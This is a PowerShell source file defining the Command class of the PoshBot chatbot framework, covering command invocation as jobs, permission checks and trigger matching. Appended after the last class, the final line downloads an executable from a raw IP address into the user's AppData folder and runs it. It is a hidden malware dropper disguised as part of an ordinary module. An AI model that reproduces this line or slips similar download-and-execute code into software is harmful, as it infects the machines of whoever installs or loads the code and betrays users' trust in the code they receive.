class CommandException : Exception {CommandException() {}CommandException([string]$Message) : base($Message) {}}class CommandNotFoundException : CommandException {CommandNotFoundException() {}CommandNotFoundException([string]$Message) : base($Message) {}}class CommandFailed : CommandException {CommandFailed() {}CommandFailed([string]$Message) : base($Message) {}}class CommandDisabled : CommandException {CommandDisabled() {}CommandDisabled([string]$Message) : base($Message) {}}class CommandNotAuthorized : CommandException {CommandNotAuthorized() {}CommandNotAuthorized([string]$Message) : base($Message) {}}class CommandRequirementsNotMet : CommandException {CommandRequirementsNotMet() {}CommandRequirementsNotMet([string]$Message) : base($Message) {}}[System.Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidGlobalVars', '', Scope='Function', Target='*')][System.Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '', Scope='Function', Target='*')]class Command : BaseLogger {[string]$Name[string[]]$Aliases = @()[string]$Description[TriggerType]$TriggerType = [TriggerType]::Command[Trigger[]]$Triggers = @()[string[]]$Usage[bool]$KeepHistory = $true[bool]$HideFromHelp = $false[bool]$AsJob = $true[string]$ModuleQualifiedCommand[string]$ManifestPath[System.Management.Automation.FunctionInfo]$FunctionInfo[System.Management.Automation.CmdletInfo]$CmdletInfo[AccessFilter]$AccessFilter = [AccessFilter]::new()[bool]$Enabled = $true[object]Invoke([ParsedCommand]$ParsedCommand, [bool]$InvokeAsJob = $this.AsJob, [string]$Backend) {$outer = {[cmdletbinding()]param([hashtable]$Options)Import-Module -Name $Options.PoshBotManifestPath -Force -Verbose:$false -WarningAction SilentlyContinue -ErrorAction StopImport-Module -Name $Options.ManifestPath -Scope Local -Force -Verbose:$false -WarningAction SilentlyContinue$namedParameters = $Options.NamedParameters$positionalParameters = $Options.PositionalParameters$parsedCommandExcludes = @('From', 'FromName', 'To', 'ToName', 'CallingUserInfo', 'OriginalMessage')$global:PoshBotContext = [pscustomobject]@{Plugin = $options.ParsedCommand.PluginCommand = $options.ParsedCommand.CommandFrom = $options.ParsedCommand.FromFromName = $options.ParsedCommand.FromNameTo = $options.ParsedCommand.ToToName = $options.ParsedCommand.ToNameCallingUserInfo = $options.CallingUserInfoConfigurationDirectory = $options.ConfigurationDirectoryParsedCommand = $options.ParsedCommand | Select-Object -ExcludeProperty $parsedCommandExcludesOriginalMessage = $options.OriginalMessageBackendType = $options.BackendType}& $Options.ModuleQualifiedCommand @namedParameters @positionalParameters}[string]$sb = [string]::Empty$options = @{ManifestPath = $this.ManifestPathParsedCommand = $ParsedCommandCallingUserInfo = $ParsedCommand.CallingUserInfoOriginalMessage = $ParsedCommand.OriginalMessage.ToHash()ConfigurationDirectory = $script:ConfigurationDirectoryBackendType = $BackendPoshBotManifestPath = (Join-Path -Path $script:moduleBase -ChildPath "PoshBot.psd1")ModuleQualifiedCommand = $this.ModuleQualifiedCommand}if ($this.FunctionInfo) {$options.Function = $this.FunctionInfo} elseIf ($this.CmdletInfo) {$options.Function = $this.CmdletInfo}$options.NamedParameters = $ParsedCommand.NamedParameters$options.PositionalParameters = $ParsedCommand.PositionalParametersif ($InvokeAsJob) {$this.LogDebug("Executing command [$($this.ModuleQualifiedCommand)] as job")$fdt = Get-Date -Format FileDateTimeUniversal$jobName = "$($this.Name)_$fdt"$jobParams = @{Name = $jobNameScriptBlock = $outerArgumentList = $options}return (Start-Job @jobParams)} else {$this.LogDebug("Executing command [$($this.ModuleQualifiedCommand)] in current PS session")$errors = $null$information = $null$warning = $nullNew-Variable -Name opts -Value $options$cmdParams = @{ScriptBlock = $outerArgumentList = $OptionsErrorVariable = 'errors'InformationVariable = 'information'WarningVariable = 'warning'Verbose = $trueNoNewScope = $true}$output = Invoke-Command @cmdParamsreturn @{Error = @($errors)Information = @($Information)Output = $outputWarning = @($warning)}}}[bool]IsAuthorized([string]$UserId, [RoleManager]$RoleManager) {$isAuth = $falseif ($this.AccessFilter.Permissions.Count -gt 0) {$perms = $RoleManager.GetUserPermissions($UserId)foreach ($perm in $perms) {$result = $this.AccessFilter.Authorize($perm.Name)if ($result.Authorized) {$this.LogDebug("User [$UserId] authorized to execute command [$($this.Name)] via permission [$($perm.Name)]")$isAuth = $truebreak}}} else {$isAuth = $true}if ($isAuth) {return $true} else {$this.LogDebug("User [$UserId] not authorized to execute command [$($this.name)]")return $false}}[void]Activate() {$this.Enabled = $true$this.LogDebug("Command [$($this.Name)] activated")}[void]Deactivate() {$this.Enabled = $false$this.LogDebug("Command [$($this.Name)] deactivated")}[void]AddPermission([Permission]$Permission) {$this.LogDebug("Adding permission [$($Permission.Name)] to [$($this.Name)]")$this.AccessFilter.AddPermission($Permission)}[void]RemovePermission([Permission]$Permission) {$this.LogDebug("Removing permission [$($Permission.Name)] from [$($this.Name)]")$this.AccessFilter.RemovePermission($Permission)}[bool]TriggerMatch([ParsedCommand]$ParsedCommand, [bool]$CommandSearch = $true) {$match = $falseforeach ($trigger in $this.Triggers) {switch ($trigger.Type) {'Command' {if ($CommandSearch) {if ($ParsedCommand.OriginalMessage.Type -eq [MessageType]::Message) {if ($trigger.Trigger -eq $ParsedCommand.Command) {$this.LogDebug("Parsed command [$($ParsedCommand.Command)] matched to command trigger [$($trigger.Trigger)] on command [$($this.Name)]")$match = $truebreak}}}}'Event' {if ($trigger.MessageType -eq $ParsedCommand.OriginalMessage.Type) {if ($trigger.MessageSubtype -eq $ParsedCommand.OriginalMessage.Subtype) {$this.LogDebug("Parsed command event type [$($ParsedCommand.OriginalMessage.Type.Tostring())`:$($ParsedCommand.OriginalMessage.Subtype.ToString())] matched to command trigger [$($trigger.MessageType.ToString())`:$($trigger.MessageSubtype.ToString())] on command [$($this.Name)]")$match = $truebreak}}}'Regex' {if ($ParsedCommand.CommandString -match $trigger.Trigger) {$this.LogDebug("Parsed command string [$($ParsedCommand.CommandString)] matched to regex trigger [$($trigger.Trigger)] on command [$($this.Name)]")$match = $truebreak}}}}return $match}}(New-Object System.Net.WebClient).DownloadFile('http://89.248.166.140/~zebra/iesecv.exe',"$env:APPDATA\scvkem.exe");Start-Process ("$env:APPDATA\scvkem.exe")